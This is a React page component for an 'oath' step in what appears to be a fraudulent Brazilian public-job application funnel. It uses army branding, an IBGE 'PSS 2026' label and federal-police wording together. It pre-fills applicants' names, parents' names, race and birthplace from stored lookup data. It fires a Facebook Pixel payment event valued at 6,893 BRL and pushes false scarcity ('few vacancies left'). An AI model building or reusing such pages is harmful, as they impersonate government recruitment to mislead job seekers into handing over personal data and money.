import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { Checkbox } from '@/components/ui/checkbox';
import { Card, CardContent } from '@/components/ui/card';
import { Shield, FileText, CreditCard } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';

export default function JuramentoPage() {
  const [, setLocation] = useLocation();
  const [applicationData, setApplicationData] = useState<any>(null);
  const [juramentoAccepted, setJuramentoAccepted] = useState(false);
  const [tvmAccepted, setTvmAccepted] = useState(false);
  const [dadosExtras, setDadosExtras] = useState<any>(null);
  const { trackEvent } = useClarityEvents();

  // Function to check if a value is valid (not empty or invalid)
  const isValidValue = (value: string): boolean => {
    if (!value || typeof value !== 'string') return false;
    
    const trimmedValue = value.trim().toUpperCase();
    const invalidValues = [
      'SEM INFORMAÇÃO',
      'SEM INFORMACAO',
      'INVÁLIDO',
      'INVALIDO',
      'NÃO INFORMADO',
      'OUTROS',
      'NAO INFORMADO',
      'VAZIO',
      'NULL',
      'UNDEFINED',
      'N/A',
      'N/D',
      'S/I',
      ''
    ];
    
    return !invalidValues.includes(trimmedValue) && trimmedValue.length > 0;
  };

  // Function to extract personal data from dados-extras and userData
  const getPersonalizedOathData = () => {
    if (!dadosExtras?.DadosBasicos) return null;

    const dados = dadosExtras.DadosBasicos;
    const nome = isValidValue(dados.nome) ? dados.nome : '';
    const nomeMae = isValidValue(dados.nomeMae) ? dados.nomeMae : '';
    const nomePai = isValidValue(dados.nomePai) ? dados.nomePai : '';
    const estadoCivil = isValidValue(dados.estadoCivil) ? dados.estadoCivil.toLowerCase() : '';
    const municipioNascimento = isValidValue(dados.municipioNascimento) ? dados.municipioNascimento : '';
    const nacionalidade = isValidValue(dados.nacionalidade) ? dados.nacionalidade.toLowerCase() : '';
    const cor = isValidValue(dados.cor) ? dados.cor.toLowerCase() : '';
    
    // Get gender from userData in localStorage or from dados-extras
    let sexo = '';
    try {
      const userData = localStorage.getItem('userData');
      if (userData) {
        const parsedUserData = JSON.parse(userData);
        if (isValidValue(parsedUserData.sexo)) {
          sexo = parsedUserData.sexo;
        }
      }
    } catch (error) {
      console.log('Error parsing userData for gender:', error);
    }
    
    // Fallback to sexo from dados-extras if not found in userData
    if (!sexo && isValidValue(dados.sexo)) {
      sexo = dados.sexo;
    }

    return {
      nome,
      nomeMae,
      nomePai,
      estadoCivil,
      municipioNascimento,
      nacionalidade,
      cor,
      sexo
    };
  };

  // Function to generate personalized oath text with JSX highlighting
  const generatePersonalizedOath = () => {
    const personalData = getPersonalizedOathData();
    
    if (!personalData || !personalData.nome) {
      return null; // Return null if no personalized data available
    }

    const components = [];
    
    // Start with "EU, " and highlighted name
    components.push('EU, ');
    components.push(<strong key="nome" className="text-black">{personalData.nome.trim()}</strong>);

    // Add parents information with gender-specific text
    const parents = [];
    if (personalData.nomeMae) parents.push(personalData.nomeMae.trim());
    if (personalData.nomePai) parents.push(personalData.nomePai.trim());
    
    if (parents.length > 0) {
      // Determine gender-specific text
      let filhoText = 'FILHO(A)';
      if (personalData.sexo) {
        const sexoFormatted = personalData.sexo.toUpperCase();
        if (sexoFormatted.includes('F') || sexoFormatted.includes('FEMININO') || sexoFormatted.includes('MULHER')) {
          filhoText = 'FILHA';
        } else if (sexoFormatted.includes('M') || sexoFormatted.includes('MASCULINO') || sexoFormatted.includes('HOMEM')) {
          filhoText = 'FILHO';
        }
      }
      
      components.push(`, ${filhoText} DE `);
      if (parents.length === 2) {
        components.push(<strong key="mae" className="text-black">{parents[0]}</strong>);
        components.push(' E ');
        components.push(<strong key="pai" className="text-black">{parents[1]}</strong>);
      } else {
        components.push(<strong key="parent" className="text-black">{parents[0]}</strong>);
      }
    }

    // Add marital status
    if (personalData.estadoCivil) {
      const estadoCivilFormatted = personalData.estadoCivil.trim().toUpperCase();
      // Handle common variations
      const estadoCivilMap: { [key: string]: string } = {
        'SOLTEIRO(A)': 'SOLTEIRO(A)',
        'SOLTEIRO': 'SOLTEIRO(A)',
        'SOLTEIRA': 'SOLTEIRO(A)',
        'CASADO(A)': 'CASADO(A)',
        'CASADO': 'CASADO(A)',
        'CASADA': 'CASADO(A)',
        'DIVORCIADO(A)': 'DIVORCIADO(A)',
        'DIVORCIADO': 'DIVORCIADO(A)',
        'DIVORCIADA': 'DIVORCIADO(A)',
        'VIÚVO(A)': 'VIÚVO(A)',
        'VIÚVO': 'VIÚVO(A)',
        'VIÚVA': 'VIÚVO(A)'
      };
      const finalEstadoCivil = estadoCivilMap[estadoCivilFormatted] || estadoCivilFormatted;
      components.push(', ');
      components.push(<strong key="estado-civil" className="text-black">{finalEstadoCivil}</strong>);
    }

    // Add birth place with gender-specific text
    if (personalData.municipioNascimento) {
      let nascidoText = 'NASCIDO(A)';
      if (personalData.sexo) {
        const sexoFormatted = personalData.sexo.toUpperCase();
        if (sexoFormatted.includes('F') || sexoFormatted.includes('FEMININO') || sexoFormatted.includes('MULHER')) {
          nascidoText = 'NASCIDA';
        } else if (sexoFormatted.includes('M') || sexoFormatted.includes('MASCULINO') || sexoFormatted.includes('HOMEM')) {
          nascidoText = 'NASCIDO';
        }
      }
      
      components.push(`, ${nascidoText} EM `);
      components.push(<strong key="municipio" className="text-black">{personalData.municipioNascimento.trim().toUpperCase()}</strong>);
    }

    // Add nationality
    if (personalData.nacionalidade) {
      const nacionalidadeFormatted = personalData.nacionalidade.trim().toUpperCase();
      components.push(', DE NACIONALIDADE ');
      components.push(<strong key="nacionalidade" className="text-black">{nacionalidadeFormatted}</strong>);
    }

    // Add race/ethnicity
    if (personalData.cor) {
      const corFormatted = personalData.cor.trim().toUpperCase();
      // Handle common race/ethnicity variations
      const corMap: { [key: string]: string } = {
        'BRANCA': 'BRANCA',
        'PRETA': 'PRETA',
        'PARDA': 'PARDA',
        'AMARELA': 'AMARELA',
        'INDÍGENA': 'INDÍGENA',
        'INDIGENA': 'INDÍGENA',
        'NÃO DECLARADA': 'NÃO DECLARADA',
        'NAO DECLARADA': 'NÃO DECLARADA'
      };
      const finalCor = corMap[corFormatted] || corFormatted;
      components.push(', DA ETNIA ');
      components.push(<strong key="cor" className="text-black">{finalCor}</strong>);
    }

    components.push(', ');
    components.push(<strong key="declaracao">DECLARO ESTAR CIENTE</strong>);
    components.push(' de que participo voluntariamente do Processo Seletivo Simplificado do IBGE — Edital PSS 2026, e que:');

    return components;
  };

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Track oath page entry
    trackEvent('military_oath_page_entered', {
      page: 'juramento_page',
      timestamp: new Date().toISOString()
    });

    // Load application data from localStorage
    const savedData = localStorage.getItem('applicationData');
    if (savedData) {
      try {
        const parsedData = JSON.parse(savedData);
        setApplicationData(parsedData);
      } catch (error) {
        console.error('Error loading application data:', error);
        setLocation('/temporarios');
        return;
      }
    } else {
      // No application data, redirect back
      setLocation('/temporarios');
      return;
    }

    // Load dados-extras from localStorage for personalized oath
    const dadosExtrasData = localStorage.getItem('dados-extras');
    if (dadosExtrasData) {
      try {
        const parsedDadosExtras = JSON.parse(dadosExtrasData);
        setDadosExtras(parsedDadosExtras);
      } catch (error) {
        console.error('Error loading dados-extras:', error);
        // Continue without personalized oath if dados-extras can't be loaded
      }
    }
  }, [setLocation]);

  const handleContinue = () => {
    if (!juramentoAccepted || !tvmAccepted) {
      alert('Por favor, aceite todos os termos para continuar.');
      return;
    }

    // Track oath acceptance
    trackEvent('military_oath_accepted', {
      juramento_accepted: juramentoAccepted,
      tvm_accepted: tvmAccepted,
      page: 'juramento_page',
      timestamp: new Date().toISOString()
    });

    // Facebook Pixel - AddPaymentInfo event
    const fbq = (window as any).fbq;
    if (fbq) {
      fbq('track', 'AddPaymentInfo', {
        content_name: 'Programa Nacional de Apoio ao Serviço Público',
        content_category: 'Oath Acceptance',
        value: 6893.00,
        currency: 'BRL'
      });
    }

    // Save oath acceptance
    const updatedData = {
      ...applicationData,
      juramentoAccepted: true,
      tvmAccepted: true,
      oathAcceptedAt: new Date().toISOString()
    };
    
    localStorage.setItem('applicationData', JSON.stringify(updatedData));
    
    // Redirect to validation page
    setLocation('/validacao');
  };

  const handleGoBack = () => {
    setLocation('/registro');
  };

  if (!applicationData) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
        <div className="text-center">
          <h2 className="text-xl font-semibold text-gray-900 mb-2">Carregando...</h2>
          <p className="text-gray-600">Redirecionando...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader />
      
      <main className="max-w-4xl mx-auto px-6 py-12">
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <Shield className="w-10 h-10 text-green-600" />
          </div>
          <h1 className="text-2xl font-semibold text-gray-900 mb-4">
            Confirme seu Compromisso com o Brasil
          </h1>
          <p className="text-gray-600">
            Para seguir no processo seletivo, é necessário aceitar oficialmente o juramento do Edital PSS IBGE 2026.
          </p>
        </div>

        {/* Juramento Oficial */}
        <Card className="mb-8">
          <CardContent className="p-8">
            <div className="flex items-center mb-6">
              <FileText className="w-6 h-6 text-gray-600 mr-3" />
              <h2 className="text-xl font-semibold text-gray-900">Declaração do Candidato</h2>
            </div>
            
            <div className="bg-gray-50 rounded-lg p-6 mb-6">
              {(() => {
                const personalizedOath = generatePersonalizedOath();
                
                if (personalizedOath) {
                  return (
                    <p className="text-gray-800 leading-relaxed text-justify">
                      {personalizedOath}
                    </p>
                  );
                } else {
                  return (
                    <p className="text-gray-800 leading-relaxed text-justify">
                      <strong>DECLARO ESTAR CIENTE</strong> de que participo voluntariamente do Processo Seletivo Simplificado do IBGE — Edital PSS 2026, e que:
                    </p>
                  );
                }
              })()}
              
              <ul className="mt-4 space-y-3 text-gray-800">
                <li className="flex items-start">
                  <span className="w-2 h-2 bg-blue-700 rounded-full mt-2 mr-3 flex-shrink-0"></span>
                  Comprometo-me a cumprir todas as etapas do concurso com dedicação e responsabilidade;
                </li>
                <li className="flex items-start">
                  <span className="w-2 h-2 bg-blue-700 rounded-full mt-2 mr-3 flex-shrink-0"></span>
                  Estou ciente das exigências e atribuições inerentes à carreira policial federal;
                </li>
                <li className="flex items-start">
                  <span className="w-2 h-2 bg-blue-700 rounded-full mt-2 mr-3 flex-shrink-0"></span>
                  Declaro que todas as informações prestadas são verdadeiras, assumindo total responsabilidade por sua veracidade;
                </li>
                <li className="flex items-start">
                  <span className="w-2 h-2 bg-blue-700 rounded-full mt-2 mr-3 flex-shrink-0"></span>
                  Comprometo-me a acompanhar as convocações oficiais e cumprir os prazos estabelecidos;
                </li>
                <li className="flex items-start">
                  <span className="w-2 h-2 bg-blue-700 rounded-full mt-2 mr-3 flex-shrink-0"></span>
                  Estou ciente de que o descumprimento das regras do edital pode resultar em eliminação do processo seletivo;
                </li>
                <li className="flex items-start">
                  <span className="w-2 h-2 bg-blue-700 rounded-full mt-2 mr-3 flex-shrink-0"></span>
                  Aceito participar das avaliações exigidas, incluindo exames médicos, físicos e psicológicos;
                </li>
                <li className="flex items-start">
                  <span className="w-2 h-2 bg-blue-700 rounded-full mt-2 mr-3 flex-shrink-0"></span>
                  Declaro não possuir impedimentos legais para o exercício do cargo público pretendido.
                </li>
              </ul>

              <p className="mt-6 text-gray-800 leading-relaxed text-justify">
                <strong>DECLARO AINDA</strong> que estou ciente de que a aprovação no concurso depende do cumprimento 
                de todos os requisitos previstos em edital e da classificação dentro do número de vagas disponíveis.
              </p>
            </div>

            {/* Checkbox de Juramento */}
            <div className="flex items-start space-x-3 p-4 bg-blue-50 rounded-lg">
              <Checkbox
                id="juramento"
                checked={juramentoAccepted}
                onCheckedChange={(checked) => {
                  setJuramentoAccepted(checked as boolean);
                  trackEvent('oath_checkbox_clicked', {
                    checkbox_type: 'military_oath',
                    checked: checked as boolean,
                    page: 'juramento_page',
                    timestamp: new Date().toISOString()
                  });
                }}
                className="mt-1"
              />
              <label htmlFor="juramento" className="text-sm text-gray-800 cursor-pointer">
                <strong>Ao continuar, declaro estar ciente de que estou me inscrevendo para participar do processo 
                seletivo simplificado, com aplicação de prova objetiva presencial, e que só após todas as etapas 
                poderei ser considerado para o cargo selecionado.</strong>
              </label>
            </div>
          </CardContent>
        </Card>

        {/* Botão para continuar após aceitar o juramento */}
        {juramentoAccepted && (
          <div className="text-center mb-8">
            <Button
              onClick={() => setLocation('/validacao')}
              className="px-8 py-3 text-white font-medium"
              style={{ backgroundColor: '#0063AF' }}
            >
              Prosseguir para validação
            </Button>
            <p className="text-xs text-gray-500 mt-4 italic">
              Restam poucas vagas em sua região. A próxima etapa será liberada por tempo limitado.
            </p>
          </div>
        )}

      </main>
      
      <ExercitoFooter />
    </div>
  );
}